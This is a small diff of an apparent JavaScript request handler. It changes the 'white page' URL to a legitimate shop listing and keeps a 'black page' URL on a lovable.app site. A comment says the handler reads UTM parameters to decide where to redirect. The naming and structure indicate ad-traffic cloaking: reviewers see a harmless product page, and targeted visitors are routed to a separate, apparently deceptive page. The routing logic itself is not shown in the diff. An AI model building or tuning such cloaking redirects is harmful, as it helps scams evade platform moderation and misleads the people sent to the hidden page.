@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ikea.com/be/en/p/boerja-training-beaker-white-blue-00596811/";
+    const whitePageURL = "https://steiner1888.com/en/Hot-water-bottle-Sophia/T-87030";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
